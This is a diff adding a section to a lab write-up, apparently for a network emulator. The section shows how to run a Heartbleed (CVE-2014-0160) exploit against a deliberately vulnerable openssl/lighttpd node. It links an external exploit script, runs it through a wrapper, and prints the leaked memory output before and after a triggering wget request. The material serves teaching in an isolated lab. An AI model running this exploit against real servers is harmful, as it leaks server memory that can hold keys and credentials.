@@ -30,5 +30,54 @@ udp4       0      0 *.618                  *.*
 udp4       0      0 *.111                  *.*      
 ```
 
-### Executing the attack
+## Executing the attack
+On the virtual nodes we have previously deployed a vulnerable version of openssl
+and lighttpd. The script [heartbleed.sh](heartbleed.sh) is used to execute the
+attack. It copies the [heartbleed.py](heartbleed.py) script on the Attacker node
+and executes it. The python script used to exploit the server can be found
+[here](https://gist.github.com/eelsivart/10174134).
 
+The execution result is as follows:
+```console
+# ./heartbleed.sh
+defribulator v1.16
+A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed
+(CVE-2014-0160)
+##################################################################
+Connecting to: 10.0.1.10:443, 1 times
+Sending Client Hello for TLSv1.0
+Received Server Hello for TLSv1.0
+
+WARNING: 10.0.1.10:443 returned more data than it should - server is vulnerable!
+Please wait... connection attempt 1 of 1
+##################################################################
+.@....SC[...r....+..H...9...
+....w.3....f...
+...!.9.8.........5...............
+.........3.2.....E.D...../...A.................................I.........
+...........
+...................................#
+```
+
+If the heartbleed script is ran repeatedly without the server actually
+processing new data the output will be the same. If we issue external requests
+from the PC node, we force the server to process some data and that causes a
+change in the leaked part of memory:
+```console
+# himage PC wget -r --no-check-certificate https://10.0.1.10/
+```
+
+After issuing the request we can see that the output of the heartbleed script
+changes:
+```console
+% sudo ./heartbleed.sh
+defribulator v1.16
+...
+##################################################################
+.@....SC[...r....+..H...9...
+....w.3....f...
+...!.9.8.........5...............
+.........3.2.....E.D...../...A.................................I.........
+...........
+...................................#........\.>.H....m..W.\...U....K
+```
